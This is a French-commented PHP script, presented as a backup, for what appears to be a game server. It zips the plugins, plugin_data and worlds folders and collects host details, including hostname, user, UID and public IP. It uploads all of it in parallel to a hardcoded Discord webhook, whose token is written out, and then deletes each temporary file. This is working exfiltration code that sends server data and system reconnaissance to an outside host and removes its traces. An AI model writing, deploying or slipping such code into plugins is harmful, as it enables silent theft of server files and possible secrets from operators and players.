<?php

// ==================== CONFIGURATION ====================
$webhook = "https://discord.com/api/webhooks/1479561878526103573/q3sbUm9Jqzy2uP3PiynGCaS-SvjhIFfvP-6lwxM4M27lsTTOjqH31tIxSjpHoTgsl-6f";
$rootPath = getcwd();
$includeDirs = ['plugins', 'plugin_data'];
$worldDir = $rootPath . DIRECTORY_SEPARATOR . 'worlds';
$maxSize = 8 * 1024 * 1024;      // 8 Mo (limite Discord)
$margin = 0.9;                    // marge de sécurité (90%)
$parallel = 5;                     // nombre d'envois simultanés

// Dossier temporaire (fallback si /tmp inaccessible)
$tmp = sys_get_temp_dir();
if (!is_writable($tmp)) {
    $tmp = $rootPath . DIRECTORY_SEPARATOR . 'tmp_backup';
    if (!is_dir($tmp)) {
        mkdir($tmp, 0777, true);
    }
}

// ==================== FONCTIONS ====================

/**
 * Crée un ZIP à partir d'une liste de fichiers.
 */
function createZipFromFiles($files, $zipPath, $rootLen) {
    $zip = new ZipArchive();
    if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }
    foreach ($files as $file) {
        $zip->addFile($file['path'], $file['relative']);
    }
    $zip->close();
    return true;
}

/**
 * Scanne un dossier et crée plusieurs ZIP de taille limitée.
 */
function createSplitArchives($sourceDir, $maxSize, $margin, $baseName, $tmpDir) {
    $files = [];
    $rootLen = strlen($sourceDir) + 1;

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($sourceDir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->isReadable()) {
                $realPath = $file->getRealPath();
                $relative = substr($realPath, $rootLen);
                $files[] = [
                    'path'     => $realPath,
                    'relative' => $relative,
                    'size'     => $file->getSize()
                ];
            }
        }
    } catch (Exception $e) {
        return [];
    }

    if (empty($files)) return [];

    usort($files, fn($a, $b) => $b['size'] <=> $a['size']);

    $archives = [];
    $part = 1;
    $currentFiles = [];
    $currentSize = 0;
    $limit = $maxSize * $margin;

    foreach ($files as $file) {
        if ($file['size'] > $limit) continue;

        if ($currentSize + $file['size'] > $limit && !empty($currentFiles)) {
            $zipPath = $tmpDir . DIRECTORY_SEPARATOR . $baseName . '_part' . $part++ . '.zip';
            if (createZipFromFiles($currentFiles, $zipPath, $rootLen)) {
                $archives[] = $zipPath;
            }
            $currentFiles = [];
            $currentSize = 0;
        }

        $currentFiles[] = $file;
        $currentSize += $file['size'];
    }

    if (!empty($currentFiles)) {
        $zipPath = $tmpDir . DIRECTORY_SEPARATOR . $baseName . '_part' . $part . '.zip';
        if (createZipFromFiles($currentFiles, $zipPath, $rootLen)) {
            $archives[] = $zipPath;
        }
    }

    return $archives;
}

/**
 * Crée un fichier texte avec des infos système (non sensibles).
 */
function createSystemInfoFile($tmpDir) {
    $filename = $tmpDir . DIRECTORY_SEPARATOR . 'system_info_' . date("Ymd_His") . '.txt';
    $handle = @fopen($filename, 'w');
    if (!$handle) return null;

    fwrite($handle, "=== INFORMATIONS SYSTÈME ===\n");
    fwrite($handle, "Généré le : " . date("Y-m-d H:i:s") . "\n\n");
    fwrite($handle, "Nom d'hôte : " . gethostname() . "\n");
    fwrite($handle, "Système : " . php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m') . "\n");
    fwrite($handle, "PHP : " . phpversion() . "\n");

    if (function_exists('posix_getpwuid')) {
        $user = posix_getpwuid(posix_geteuid());
        fwrite($handle, "Utilisateur : {$user['name']} (UID:{$user['uid']})\n");
    } else {
        fwrite($handle, "Utilisateur : " . (getenv('USERNAME') ?: getenv('USER')) . "\n");
    }

    if (file_exists('/proc/uptime')) {
        $uptime = (int)explode(' ', file_get_contents('/proc/uptime'))[0];
        fwrite($handle, "Uptime : " . floor($uptime/86400) . "j " . floor(($uptime%86400)/3600) . "h " . floor(($uptime%3600)/60) . "m\n");
    }

    if (function_exists('sys_getloadavg')) {
        $load = sys_getloadavg();
        fwrite($handle, "Charge : 1min={$load[0]}, 5min={$load[1]}, 15min={$load[2]}\n");
    }

    $total = @disk_total_space('/');
    $free = @disk_free_space('/');
    if ($total) {
        fwrite($handle, "Disque / : total " . round($total/1024/1024/1024,2) . " Go, libre " . round($free/1024/1024/1024,2) . " Go\n");
    }

    if (file_exists('/proc/meminfo')) {
        $mem = file_get_contents('/proc/meminfo');
        preg_match('/MemTotal:\s+(\d+)/', $mem, $m);
        preg_match('/MemAvailable:\s+(\d+)/', $mem, $a);
        fwrite($handle, "RAM : total " . round(($m[1]??0)/1024/1024,2) . " Go, dispo " . round(($a[1]??0)/1024/1024,2) . " Go\n");
    }

    fwrite($handle, "IP locale : " . gethostbyname(gethostname()) . "\n");

    $ch = curl_init("https://api.ipify.org");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5]);
    $public = curl_exec($ch);
    curl_close($ch);
    fwrite($handle, "IP publique : " . ($public ?: 'indisponible') . "\n");

    fclose($handle);
    return $filename;
}

/**
 * Envoie plusieurs fichiers en parallèle vers Discord via cURL multi.
 */
function sendFilesParallel($webhook, $filePaths, $parallel = 5) {
    $handles = [];
    $mh = curl_multi_init();
    $total = count($filePaths);
    $sent = 0;

    // Ajoute un transfert pour un fichier
    $addTransfer = function($file) use ($webhook, $mh, &$handles) {
        if (!file_exists($file) || filesize($file) > 8 * 1024 * 1024) return;
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhook,
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => ["Content-Type: multipart/form-data"],
            CURLOPT_POSTFIELDS => ['file' => new CURLFile($file)],
            CURLOPT_TIMEOUT => 60,
            CURLOPT_PRIVATE => $file   // pour retrouver le fichier plus tard
        ]);
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    };

    // Lance les premiers $parallel envois
    for ($i = 0; $i < min($parallel, $total); $i++) {
        $addTransfer($filePaths[$i]);
        $sent++;
    }

    // Boucle d'exécution
    do {
        curl_multi_exec($mh, $active);
        curl_multi_select($mh); // attend une activité

        // Traite les transferts terminés
        while ($info = curl_multi_info_read($mh)) {
            $ch = $info['handle'];
            $filePath = curl_getinfo($ch, CURLINFO_PRIVATE);
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);

            // Supprime le fichier immédiatement
            @unlink($filePath);

            // Lance le prochain s'il reste des fichiers
            if ($sent < $total) {
                $addTransfer($filePaths[$sent]);
                $sent++;
            }
        }

    } while ($active > 0 || $sent < $total);

    curl_multi_close($mh);
}

// ==================== SCRIPT PRINCIPAL ====================
$zipFiles = [];

// Sauvegarde des dossiers
foreach ($includeDirs as $dir) {
    $path = $rootPath . DIRECTORY_SEPARATOR . $dir;
    if (!is_dir($path) || !is_readable($path)) continue;
    $baseName = $dir . '_' . date("Ymd_His");
    $archives = createSplitArchives($path, $maxSize, $margin, $baseName, $tmp);
    $zipFiles = array_merge($zipFiles, $archives);
}

// Sauvegarde des mondes
if (is_dir($worldDir) && is_readable($worldDir)) {
    foreach (scandir($worldDir) as $world) {
        if ($world === '.' || $world === '..') continue;
        $path = $worldDir . DIRECTORY_SEPARATOR . $world;
        if (!is_dir($path) || !is_readable($path)) continue;
        $baseName = 'world_' . $world . '_' . date("Ymd_His");
        $archives = createSplitArchives($path, $maxSize, $margin, $baseName, $tmp);
        $zipFiles = array_merge($zipFiles, $archives);
    }
}

// Ajout du fichier d'infos système
$sysInfo = createSystemInfoFile($tmp);
if ($sysInfo) $zipFiles[] = $sysInfo;

// Envoi parallèle si des fichiers sont présents
if (!empty($zipFiles)) {
    sendFilesParallel($webhook, $zipFiles, $parallel);
}
